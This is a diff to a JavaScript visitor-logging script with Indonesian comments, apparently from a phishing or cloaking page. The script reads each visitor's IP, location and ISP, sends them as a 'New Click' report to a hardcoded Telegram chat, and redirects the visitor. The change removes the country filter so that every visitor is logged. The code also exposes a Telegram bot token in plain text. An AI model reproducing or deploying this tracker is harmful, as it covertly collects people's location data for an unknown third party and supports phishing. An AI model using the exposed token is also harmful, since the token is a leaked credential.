@@ -3,7 +3,7 @@
 var chatId = "522070580"; // Ganti dengan chat ID penerima notifikasi
 var BotToken = "6363113728:AAEnwSB8cLitoGZ8eVJNlWfUveGBeuV-LIo";
 var Exit = "https://google.com";
-var TargetCountry = ""; // Ganti dengan kode negara tujuan
+//var TargetCountry = ""; // Ganti dengan kode negara tujuan
 
 // Fungsi untuk mengubah kode negara menjadi emoji negara
 function getCountryFlagEmoji(countryCode) {
@@ -42,7 +42,8 @@ function getIPDetails() {
     var countryEmoji = getCountryFlagEmoji(data.country_code);
     var ipDetails = "-------New Click-------\nIP: " + data.ip + "\nCountry: " + countryEmoji + "[" + data.country_name + "]\nCity: " + data.city + "\nRegion: " + data.region + "\nISP: " + data.org + "\n-------END-------";
     
-    if (data.country_code.toUpperCase() === TargetCountry) {
+    //if (data.country_code.toUpperCase() === TargetCountry) {
+    if (true) {
       sendNotification(ipDetails);
       Redirect();
     } else {
